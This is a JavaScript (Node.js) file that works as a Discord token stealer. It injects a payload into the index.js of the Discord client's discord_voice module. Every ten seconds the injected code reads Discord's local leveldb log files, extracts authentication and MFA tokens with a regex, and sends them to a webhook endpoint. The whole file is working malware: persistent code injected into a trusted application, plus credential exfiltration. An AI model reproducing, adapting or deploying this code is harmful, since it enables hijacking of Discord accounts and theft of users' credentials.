//Dependencies
const Fs = require("fs")
const Os = require("os")

//Variables
var malicious_code = `\nconst os = require("os")

setInterval(function(){
    fs.readdir("C:/Users/" + os.userInfo().username + "/AppData/Roaming/discord/Local Storage/leveldb", "utf8", function(err, files){
        if(err){
            Done()
            return
        }
		
        files.forEach(file =>{
            if(file.indexOf("log") != -1){
                const log_data = fs.readFileSync("C:/Users/" + os.userInfo().username + "/AppData/Roaming/discord/Local Storage/leveldb/" + file, "utf8")
                const tokens = log_data.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g)
                var result_tokens = ""

                if(!log_data.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g)){
                    console.log("No discord tokens found.")
                    return
                }

                for( i = 0; i <= tokens.length-1; i++ ){
                    if(result_tokens.indexOf(tokens[i]) == -1){
                        if(result_tokens.length == 0){
                            result_tokens = tokens[i]
                        }else{
                            result_tokens += ", " + tokens[i]
                        }
                    }
                }

                fetch("webhook_link", {
					method: "POST",
					headers: {
						"Content-Type": "application/json"
					},
					body: JSON.stringify({ content: result_tokens })
				})
                return
            }
        })
    })
}, 10000)`

//Main
if(Fs.existsSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord`)){
    const Directories = source => Fs.readdirSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)

    Directories().forEach(directory =>{
        const Directories2 = source => Fs.readdirSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)

        if(directory.indexOf("app") != -1){
            Directories2().forEach(directory2 =>{
                if(directory2.indexOf("discord_voice") != -1){
                    Fs.readFile(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\${directory2}\\discord_voice\\index.js`, "utf8", function(err, data){
                        if(err){
                            process.exit()
                        }
                
                        if(data.indexOf("fetch(") != -1){
                            process.exit()
                        }
                
                        data += `\n${malicious_code}`
                
                        Fs.writeFileSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\${directory2}\\discord_voice\\index.js`, data, "utf8")
                    })
                }
            })
        }
    })
}
